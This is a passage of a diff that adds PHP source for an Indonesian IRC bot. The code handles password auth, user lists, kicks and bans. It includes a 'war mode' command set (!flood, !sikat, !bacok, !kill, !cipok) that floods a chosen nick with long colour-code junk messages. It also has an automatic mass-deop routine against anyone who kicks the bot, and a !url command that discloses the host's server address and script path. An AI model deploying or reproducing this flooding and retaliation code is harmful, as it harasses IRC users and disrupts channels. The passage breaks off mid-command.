+                    fputs($fp,'NOTICE '.$dNick.' :Jangan buat onar di chan ku dunk plezZZ..!'. CRL);
+                    fputs($fp,'MODE '.$dcom[1].' -o '.$dNick.''. CRL);
+                    fputs($fp,'MODE '.$dcom[1].' -o '.$dNick.''. CRL);
+                    fputs($fp,'MODE '.$dcom[1].' -h '.$dNick.''. CRL);
+                    fputs($fp,'MODE '.$dcom[1].' -h '.$dNick.''. CRL);
+                    fputs($fp,'MODE '.$dcom[1].' -o '.$dNick.''. CRL);
+                    fputs($fp,'MODE '.$dcom[1].' -h '.$dNick.''. CRL);
+                    $ada = TRUE;
+                  }
+                }
+                /*** Proteksi Flood ***/
+                if (strlen($pesan)>$maxkar) {
+                    $jawab = $rflood;
+                    $jawab = str_replace("<nick>",$dNick,$jawab);
+                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
+                    fputs($fp,'MODE '.$dcom[1].' +b '.$dNick.''. CRL);
+                    fputs($fp,'KICK '.$dcom[1].' '.$dNick.' :4,1AncoOoX ojo ngeflood su layarQ bek '.$dNick.'!! Max: '.$maxkar. CRL);
+                    fputs($fp,'NOTICE '.$dNick.' :9,1KAMU SUKA MAINAN PLOOD TOW !!!!!! 4KASIH DAAAAH 8:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@:)@:D@'. CRL);
+                    fputs($fp,'NOTICE '.$dNick.' :13,5Siiiiikkaaattt 4XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:D@'. CRL);
+                }
+              }
+            }
+          }
+        }
+        $dNick = strtolower($dNick);
+        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
+          $musuh = $dNick;
+          fputs($fp,'JOIN '.$dcom[1]. CRL);
+          fputs($fp,'MODE '.$dcom[1].' -o '.$dNick.''. CRL);
+          fputs($fp,'KICK '.$dcom[1].' '.$musuh.' :11,1<[ 0JURUS 12CIIPOOKKKK 9MLAYU 13Eeemmmuuuuuuacch11 ]>' . CRL);
+          fputs($fp,'MODE '.$dcom[1].' -o '.$dNick.''. CRL);
+          fputs($fp,'MODE '.$dcom[1].' -o '.$dNick.''. CRL);
+          fputs($fp,'MODE '.$dcom[1].' -o '.$dNick.''. CRL);
+          fputs($fp,'MODE '.$dcom[1].' -h '.$dNick.''. CRL);
+          fputs($fp,'MODE '.$dcom[1].' -h '.$dNick.''. CRL);
+          fputs($fp,'MODE '.$dcom[1].' -h '.$dNick.''. CRL);
+          fputs($fp,'MODE '.$dcom[1].' -o '.$dNick.''. CRL);
+        }
+        elseif ($dcom[0]=='NICK' || $dcom[0]=='QUIT' || $dcom[0]=='PART') {
+          if ($auth["$dNick"]) {
+            if ($auth["$dNick"]["pass"]) {
+              if ($auth["$dNick"]["auth"]==2) {
+                if ($dcom[0]=='NICK') {
+                  $com = explode(" ", $data);
+                  $chnick = strtolower(str_replace(':','',$com[2]));
+                  if ($dNick!=$chnick) {
+                    $auth["$dNick"]["auth"] = 1;
+                    fputs($fp,'NOTICE '.$chnick.' :Kemana boss?' . CRL);
+                  }
+                }
+                else { $auth["$dNick"]["auth"] = 1; fputs($fp,'NOTICE '.$dNick.' :Mo kemana boss?' . CRL); }
+              }
+            }
+            else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password> ' . CRL); }
+          }
+        }
+	    elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
+          $dcom[2] = strtolower($dcom[2]);
+		  if ($auth["$dcom[2]"]) {
+            if ($auth["$dcom[2]"]["pass"]) {
+              if ($auth["$dcom[2]"]["auth"]==1) {
+                $auth["$dcom[2]"]["auth"] = 2; $whois = "";
+			    fputs($fp,'NOTICE ' . $dcom[2] . ' :'.$auth["$dcom[2]"]["status"].', siap!' . CRL);
+              }
+              else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Kan udah auth tadi! ' . CRL); }
+            }
+            else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Passwordnya blom diset! Ketik: pass <password> buat ngeset password, kemudian auth lagi deh ' . CRL); }
+          }
+          else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
+       }
+       elseif ($dcom[0]=='NOTICE') {
+         $com = explode(" ", $data);
+         if ($com[3]==':KB' && $com[4] && $com[5] && $com[6]) {
+           $msg = str_replace('','',$data);
+           $msg = strstr($msg,":KB");
+           $msg = str_replace(":KB $com[4]","",$msg);
+           fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
+           fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
+         }
+       }
+       elseif ($dcom[0]=='PRIVMSG') {
+         $com = explode(" ", $data);
+         if ($com[3]==':VERSION') {
+           fputs($fp,'NOTICE '.$dNick.' :'.chr(1).'waduh aq di intip nihh malu ah!!! =-'.chr(1) . CRL);
+         }
+         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
+           if ($auth["$dNick"]) {
+             if ($auth["$dNick"]["pass"]) {
+               if ($auth["$dNick"]["auth"]==1) {
+                 if ($com[4]===$auth["$dNick"]["pass"]) {
+                   $auth["$dNick"]["auth"] = 2;
+                   fputs($fp,'NOTICE ' . $dNick . ' :Anda adalah '.$auth["$dNick"]["status"].' saya bozz! ' . CRL);
+                 }
+                 else { fputs($fp,'NOTICE ' . $dNick . ' :Password Salah!! ' . CRL); }
+               }
+               else { fputs($fp,'NOTICE ' . $dNick . ' :Tadi kan udah! ' . CRL); }
+             }
+             else { fputs($fp,'NOTICE ' . $dNick . ' :Password blom diset! Ketik: pass <password> untuk ngeset password, kemudian auth lagi deh ' . CRL); }
+           }
+           else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
+         }
+         elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
+           if ($auth["$dNick"]) {
+             if ($auth["$dNick"]["pass"]) {
+               if ($auth["$dNick"]["auth"]==2) {
+                 $auth["$dNick"]["auth"] = 1;
+                 fputs($fp,'NOTICE ' . $dNick . ' :Logout sukses! ' . CRL);
+               }
+               else { fputs($fp,'NOTICE ' . $dNick . ' :Kan udah logout! ' . CRL); }
+             }
+             else { fputs($fp,'NOTICE ' . $dNick . ' :Password blom diset! Ketik: pass <password> untuk ngeset password, kemudian auth lagi deh ' . CRL); }
+           }
+           else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
+         }
+         elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
+           if ($auth["$dNick"]) {
+             if (!$auth["$dNick"]["pass"]) {
+               $auth["$dNick"]["pass"] = $com[4];
+               $auth["$dNick"]["auth"] = 1;
+               fputs($fp,'NOTICE ' . $dNick . ' :Password dah diset ke '.$auth["$dNick"]["pass"].', ketik auth <password> Buat auth! ' . CRL);
+             }
+             else { fputs($fp,'NOTICE ' . $dNick . ' :Password udeh di set! ketik: auth <password> buat auth ' . CRL); }
+           }
+           else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada nih! ganti nick kemudian auth lagi! ' . CRL); }
+         }
+         elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
+           if ($auth["$dNick"]) {
+             if ($auth["$dNick"]["auth"]==2) {
+               if ($com[4]===$auth["$dNick"]["pass"]) {
+                 $auth["$dNick"]["pass"] = $com[5];
+                 fputs($fp,'NOTICE ' . $dNick . ' :Password baru di set ke '.$auth["$dNick"]["pass"].', ketik: auth <passwrd> buat auth! ' . CRL);
+               }
+               else { fputs($fp,'NOTICE ' . $dNick . ' :Wew password lama salah! ketik: chgpass <passwd lama> <passwd baru> tuk ganti password ' . CRL); }
+             }
+             else { fputs($fp,'NOTICE ' . $dNick . ' :Auth dulu donk! ketik: auth <password> untuk auth ' . CRL); }
+           }
+           else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ketemu nieh, ganti nick kemudian auth lagi coba ' . CRL); }
+         }
+         elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
+           $com[4] = strtolower($com[4]);
+           if ($auth["$dNick"]["auth"]==2) {
+             if ($auth["$dNick"]["status"]=="Admin") {
+               if ($com[5]=="master" || $com[5]=="user") {
+                 $auth["$com[4]"]["name"] = $com[4];
+                 $auth["$com[4]"]["status"] = $com[5];
+                 fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
+                 fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya, ditambahkan oleh '.$dNick.'. Ketik: pass <password> untuk mengatur password anda ' . CRL);
+               }
+               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
+             }
+             elseif ($auth["$dNick"]["status"]=="master") {
+               if (!$auth["$com[4]"]) {
+                 if ($com[5]=="user") {
+                   $auth["$com[4]"]["name"] = $com[4];
+                   $auth["$com[4]"]["status"] = $com[5];
+                   fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
+                   fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya ditambahkan oleh '.$dNick.'. Ketik: pass <passsword> untuk mengatur password anda ' . CRL);
+                 }
+                 else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> user ' . CRL); }
+               }
+               else { fputs($fp,'NOTICE ' . $dNick . ' :User telah ada! Aborting AddUser! ' . CRL); }
+             }
+             else { fputs($fp,'NOTICE ' . $dNick . ' :Status tidak diketahui! Your Status is '.$auth["$dNick"]["status"] . CRL); }
+           }
+           else { fputs($fp,'NOTICE ' . $dNick . ' :Mohon auth dulu! Ketik: auth <password> ' . CRL); }
+         }
+         elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
+           $com[4] = strtolower($com[4]);
+           if ($auth["$dNick"]["auth"]==2) {
+             if ($auth["$dNick"]["status"]=="Admin") {
+               if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
+                 unset($auth["$com[4]"]);
+                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
+                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
+               }
+               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
+             }
+             elseif ($auth["$dNick"]["status"]=="master") {
+               if ($auth["$com[4]"]["status"]=="user") {
+                 unset($auth["$com[4]"]);
+                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
+                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
+               }
+               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
+             }
+             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
+           }
+           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
+         }
+         elseif ($auth["$dNick"]["status"]) {
+           if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
+             $chan = strstr($dCommand,"#");
+             $anick = str_replace("PRIVMSG ","",$dCommand);
+             if ($com[3]==':!auth') {
+               if ($auth["$dNick"]["auth"]==2) {
+                 fputs($fp,'NOTICE '.$dNick.' :Tadi kan udah! ' . CRL);
+               }
+               else {
+                 $whois = $dNick;
+                 fputs($fp,'WHOIS '.$dNick . CRL);
+               }
+             }
+             elseif ($com[3]==':!auth' && $chan) {
+               if ($auth["$dNick"]["auth"]==2) {
+                 fputs($fp,'PRIVMSG '.$chan.' :ok '.$dNick.' ! ' . CRL);
+               }
+               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', ga boleh tuh! ' . CRL); }
+             }
+             elseif ($auth["$dNick"]["auth"]==2) {
+               if ($com[3]==':!say' && $com[4] && $chan) {
+                 $msg = strstr($data,":!say");
+                 $msg = str_replace(":!say ","",$msg);
+                 fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
+               }
+               elseif ($com[3]==':!act' && $com[4] && $chan) {
+                 $msg = strstr($data,":!act");
+                 $msg = str_replace(":!act ","",$msg);
+                 fputs($fp,'PRIVMSG '.$chan.' :ACTION '.$msg.''. CRL);
+               }
+               elseif ($com[3]==':!slap' && $com[4] && $chan) {
+                 fputs($fp,'PRIVMSG '.$chan.' :ACTION slap '.$com[4].' pake kursi n meja sekaligus isi na Bruuuookkk'. CRL);
+               }
+               elseif ($com[3]==':!msg' && $com[4] && $com[5]) {
+                 $msg = strstr($data,":!msg");
+                 $msg = str_replace(":!msg $com[4] ","",$msg);
+                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
+               }
+               elseif ($com[3]==':!notice' && $com[4] && $com[5]) {
+                 $msg = strstr($data,":!notice");
+                 $msg = str_replace(":!notice $com[4] ","",$msg);
+                 fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
+               }
+               elseif ($com[3]==':!flood' && $com[4] && $com[5]) {
+                 $msg = strstr($data,":!flood");
+                 $msg = str_replace(":!flood $com[4] ","",$msg);
+                 fputs($fp,'NOTICE '.$com[4].' :1,1.@@@@@@@@@@@4,14 @@@@:):):):):):):):):):)@@@@@@ 4,8 @@@@@@@@@:):):):):):):):)@@@@@@@@@15,4@@@@@@@@@:):):):):):):):)@@@@@@@@4,8@@@@@@@@@@@@@@@@@@@@@@@@@@:):):):):):):):)@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'. CRL);
+                 fputs($fp,'PRIVMSG '.$com[4].' :11,8.@@@@@@@@@@@@@@@@@@:):):):):):):):)@@@@@@@@@@@@@@ 4,8 @@@@@@@@:):):):):):):):)@@@@@@@@@@@@@@@@@@@@@@15,4@@@@@@@@:):):):):):):):)@@@@@@@@@@@@@@@@@@@@@@@@:):):):):):):):)@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'. CRL);
+               }
+               elseif ($com[3]==':!sikat' && $com[4] && $com[5]) {
+                 $msg = strstr($data,":!sikat");
+                 $msg = str_replace(":!sikat $com[4] ","",$msg);
+                 fputs($fp,'NOTICE '.$com[4].' :8????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.11????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.'. CRL);
+                 fputs($fp,'PRIVMSG '.$com[4].' :9????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.13????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.'. CRL);
+                 fputs($fp,'NOTICE '.$com[4].' :0,9????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.0,1????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.'. CRL);
+                 fputs($fp,'PRIVMSG '.$com[4].' :0,11????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.15,11????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.'. CRL);
+                 fputs($fp,'NOTICE '.$com[4].' :14,1????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.4,1????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.'. CRL);
+                 fputs($fp,'PRIVMSG '.$com[4].' :3,1????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.0,11????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.'. CRL);
+               }
+               elseif ($com[3]==':!bacok' && $com[4] && $com[5]) {
+                 $msg = strstr($data,":!bacok");
+                 $msg = str_replace(":!bacok $com[4] ","",$msg);
+                 fputs($fp,'PRIVMSG '.$com[4].' :11????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.'. CRL);
+                 fputs($fp,'PRIVMSG '.$com[4].' :4,1X@6X@7X@8X@9X@10X@11X@12X@13X@14X@15X@3X@7X@8X@3X@2X@14X@6X@7X@8X@9X@10X@11X@12X@13X@14X@15X@3X@7X@8X@3X@2X@14X@6X@7X@8X@9X@10X@11X@12X@13X@14X@15X@3X@'. CRL);
+                 fputs($fp,'PRIVMSG '.$com[4].' :8????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.'. CRL);
+                 fputs($fp,'PRIVMSG '.$com[4].' :11,15:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@_@(G)'. CRL);
+               }
+               elseif ($com[3]==':!kill' && $com[4] && $com[5]) {
+                 $msg = strstr($data,":!kill");
+                 $msg = str_replace(":!kill $com[4] ","",$msg);
+                 fputs($fp,'NOTICE '.$com[4].' :11????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.'. CRL);
+                 fputs($fp,'NOTICE '.$com[4].' :4,1X@6X@7X@8X@9X@10X@11X@12X@13X@14X@15X@3X@7X@8X@3X@2X@14X@6X@7X@8X@9X@10X@11X@12X@13X@14X@15X@3X@7X@8X@3X@2X@14X@6X@7X@8X@9X@10X@11X@12X@13X@14X@15X@3X@'. CRL);
+                 fputs($fp,'NOTICE '.$com[4].' :8????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????.'. CRL);
+                 fputs($fp,'NOTICE '.$com[4].' :11,15:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@:D@_@(G)'. CRL);
+               }
+               elseif ($com[3]==':!cipok' && $com[4] && $com[5]) {
+                 $msg = strstr($data,":!cipok");
+                 $msg = str_replace(":!cipok $com[4] ","",$msg);
+                 fputs($fp,'NOTICE '.$com[4].' :?11,1?????????????????????????12 3???????????????????????? ????????????????????????4 5???????????????????????? 6????????????????????????  8 7????????????????????????????????????????????????8 9????????????????????????10  1112???????????????????????? 1314 15????????????????????????????????????????????????.'. CRL);
+                 fputs($fp,'PRIVMSG '.$com[4].' :?11,1?????????????????????????12 3???????????????????????? ????????????????????????4 5???????????????????????? 6????????????????????????  8 7????????????????????????????????????????????????8 9????????????????????????10  1112???????????????????????? 1314 15????????????????????????????????????????????????.'. CRL);
+                 fputs($fp,'NOTICE '.$com[4].' :1K@????????????????????????2K@3K@4K@5K@6K@7K@8K@9K@10K@11K@12K@13K@14K@15K@3K@7K@8K@3K@2K@14K@6K@3K@7K@8K@3K@2K@14K@6K@3K@7K@8K@3K@2K@14K@6K@3K@7K@8K@3K@2K@14K@6K@3K@7K@8K@3K@2K@14K@6K@3K@7K@8K@3K@2K@14K@6K@'. CRL);
+                 fputs($fp,'PRIVMSG '.$com[4].' :1K@????????????????????????2K@3K@4K@5K@6K@7K@8K@9K@10K@11K@12K@13K@14K@15K@3K@7K@8K@3K@2K@14K@6K@3K@7K@8K@3K@2K@14K@6K@3K@7K@8K@3K@2K@14K@6K@3K@7K@8K@3K@2K@14K@6K@3K@7K@8K@3K@2K@14K@6K@3K@7K@8K@3K@2K@14K@6K@'. CRL);
+                 fputs($fp,'NOTICE '.$com[4].' :0,1H@????????????????????????2H@3H@4H@5H@6H@7H@8H@9H@10H@11H@12H@13H@14H@15H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@'. CRL);
+                 fputs($fp,'PRIVMSG '.$com[4].' :4,1H@6H@7H@8H@9H@10H@11H@12H@13H@14H@15H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@'. CRL);
+                 fputs($fp,'NOTICE '.$com[4].' :0,1H@????????????????????????2H@3H@4H@5H@6H@7H@8H@9H@10H@11H@12H@13H@14H@15H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@'. CRL);
+                 fputs($fp,'PRIVMSG '.$com[4].' :4,1H@6H@7H@8H@9H@10H@11H@12H@13H@14H@15H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@3H@7H@8H@3H@2H@14H@6H@'. CRL);
+               }
+               elseif ($com[3]==':!fs') {
+                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :4,14 [ Vj_Denie FS ] --> 9,1 deny_setiawanz@yahoo.co.id 4,8 add yach!! '. CRL); }
+               }
+               elseif ($com[3]==':!promo') {
+                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :1,3 Join #blitas yach!!!4,8xixixixixi  '. CRL); }
+               }
+               elseif ($com[3]==':!iklan') {
+                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :15,4 Join blitas 1,11 Bergabunglah menjadi anggota 5Bromo'. CRL); }
+               }
+               elseif ($com[3]==':!ctcp' && $com[4] && $com[5]) {
+                 $msg = strstr($data,":!ctcp");
+                 $msg = str_replace(":!ctcp $com[4] ","",$msg);
+                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.''. CRL);
+               }
+               elseif ($com[3]==':!pung' && $chan) {
+                 $sml = $smile[rand(0,count($smile) - 1)];
+                 fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', PONG! '.$sml. CRL);
+               }
+               elseif ($com[3]==':!pong' && $chan) {
+                 $sml = $smile[rand(0,count($smile) - 1)];
+                 fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', PING! '.$sml. CRL);
+               }
+               elseif ($com[3]==':!url') {
+                 if ($auth["$dNick"]["status"]=="Admin") {
+                 $bhost = $_SERVER['HTTP_HOST'];
+                 $bip = $_SERVER['SERVER_ADDR'];
+                 $bphp  = $_SERVER['PHP_SELF'];
+                 $bruri = $_SERVER['REQUEST_URI'];
+                 $brip = $_SERVER['REMOTE_ADDR'];
+                 $brport = $_SERVER['REMOTE_PORT'];
+                 fputs($fp,"NOTICE $dNick :Host: $bhost | Script: $bphp | Referer: $bruri | IP: $bip | Your IP: $brip Port:$brport" . CRL);
+                }
+               }
+               elseif ($com[3]==':!bantuan') {
+                 if ($auth["$dNick"]["status"]=="Admin") {
+                 fputs($fp,"PRIVMSG $dNick :9,1-=[0 SHirohige CREW BOT POWER 9]=-" . CRL);
+                 fputs($fp,"PRIVMSG $dNick :1- Jurus2 Mode Perang -" . CRL);
+                 fputs($fp,"PRIVMSG $dNick :6!sikat <nick/musuh> - serangan kotak2 Notice & PV 3X" . CRL);
+                 fputs($fp,"PRIVMSG $dNick :6!flood <nick/musuh> - serangan Ringan Notice & PV 1X" . CRL);
+                 fputs($fp,"PRIVMSG $dNick :6!bacok <nick/musuh> - serangan ampuh PV 4X" . CRL);
+                 fputs($fp,"PRIVMSG $dNick :6!kill <nick/musuh> - serangan ampuh Notice 4X" . CRL);
+                 fputs($fp,"PRIVMSG $dNick :6!cipok <nick/musuh> - serangan dasyat Notice & PV 4X" . CRL);
+                 fputs($fp,"PRIVMSG $dNick :1Serangan Siiaap Dilaksanakan !!" . CRL);
+                }
+               }
+               elseif ($com[3]==':!up' && $chan) {
+                 fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
+               }
+               elseif ($com[3]==':!down' && $chan) {
+                 fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
+               }
+               elseif ($com[3]==':!cycle' && $chan && $auth["$dNick"]["status"]!="user") {
+                 $msg = strstr($data,":!cycle");
+                 if (ereg("#", $com[4])) {
+                   $partchan = $com[4];
+                   $msg = str_replace(":!cycle $com[4]","",$msg);
+                 }
+                 else {
+                   $partchan = $chan;
+                   $msg = str_replace(":!cycle","",$msg);
+                 }
+                 if (strlen($msg)<3) {
+                   $msg = '';
+                 }
+                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
+                 fputs($fp, 'JOIN '.$partchan . CRL);
+               }
+               elseif ($com[3]==':!uwer' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
+                 $msg = strstr($data,":!uwer");
+                 if (ereg("#", $com[4])) {
+                   $partchan = $com[4];
+                   $msg = str_replace(":!uwer $com[4]","",$msg);
+                 }
+                 else {
+                   $partchan = $chan;
+                   $msg = str_replace(":!uwer","",$msg);
+                 }
+                 if (strlen($msg)<3) {
+                   $msg = '';
+                 }
+                 fputs($fp, 'JOIN '.$partchan . CRL);
+                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
+                 fputs($fp, 'JOIN '.$partchan . CRL);
+                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
+                 fputs($fp, 'JOIN '.$partchan . CRL);
+                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
+                 fputs($fp, 'JOIN '.$partchan . CRL);
+                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
+                 fputs($fp, 'JOIN '.$partchan . CRL);
+                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
+               }
+               elseif ($com[3]==':!p' && $auth["$dNick"]["status"]=="Admin") {
+                 $msg = strstr($data,":!p");
+                 if (ereg("#", $com[4])) {
+                   $partchan = $com[4];
+                   $msg = str_replace(":!p $com[4]","",$msg);
+                 }
+                 else {
+                   $partchan = $chan;
+                   $msg = str_replace(":!p","",$msg);
+                 }
+                 if (strlen($msg)<3) {
+                   $msg = '';
+                 }
+                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
+                 $remchan = strtolower($partchan);
+                 if (in_array($remchan, $channel)) {
+                   $channels = str_replace("$remchan ","",$channels);
+                   unset($channel);
+                   $channel = explode(" ", $channels);
+                 }
+                 foreach ($channel as $v) {
+                   fputs($fp, 'JOIN '.$v . CRL);
+                 }
+               }
+               //elseif ($com[3]==':!j' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
+               elseif ($com[3]==':!j' && $com[4]) {
+                 if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
+                 $addchan = strtolower($com[4]);
+                 if (!in_array($addchan, $channel)) {
+                   $channel[]=$addchan;
+                   $channels.="$addchan ";
+                 }
+                 foreach ($channel as $v) {
+                   sleep(rand(1,6));
+                   fputs($fp, 'JOIN '.$v . CRL);
+                 }
+               }
+               //elseif ($com[3]==':!n' && $com[4] && !$chan && $auth["$dNick"]["status"]=="Admin") {
+               elseif ($com[3]==':!n' && $com[4] && !$chan) {
+                 $nick = $com[4];
+                 $identify = $com[5];
+                 fputs($fp, 'NICK '.$nick . CRL);
+               }
+               elseif ($com[3]==':!k' && $com[4] && $chan) {
+                 $msg = strstr($data,":!k");
+                 $msg = str_replace(":!k $com[4]","",$msg);
+                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
+               }
+               elseif ($com[3]==':!kb' && $com[4] && $chan) {
+                 $msg = strstr($data,":!kb");
+                 $msg = str_replace(":!kb $com[4]","",$msg);
+                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
+                 fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
+               }
+               elseif ($com[3]==':!berubah') {
+                 $nick = $nicky[rand(0,count($nicky) - 1)].$nicky[rand(0,count($nicky) - 1)];
+                 fputs($fp, 'NICK '.$nick . CRL);
